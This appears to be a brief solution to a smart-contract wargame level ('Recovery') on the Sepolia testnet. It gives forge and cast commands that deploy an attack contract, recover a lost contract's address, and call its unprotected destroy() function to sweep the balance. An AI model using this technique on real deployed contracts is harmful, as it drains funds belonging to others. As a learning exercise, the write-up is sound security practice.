# Recovery Solution

Deploy `RecoveryHack`:

```
forge create RecoveryHack --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```

Call the `attack()` function to retrieve the `lostContractAddress`:

```
cast call `recoveryHackAddress` "attack(address)" `ìnstanceAddress` --rpc-url $SEPOLIA_RPC_URL
```

Truncate the first 24 zeros from `lostContractAddress` and call the `destroy()` function:

```
cast send `lostContractAddress` "destroy(address)" `sepoliaPublicKey` --rpc-url $SEPOLIA_RPC_URL --account sepoliaKey
```
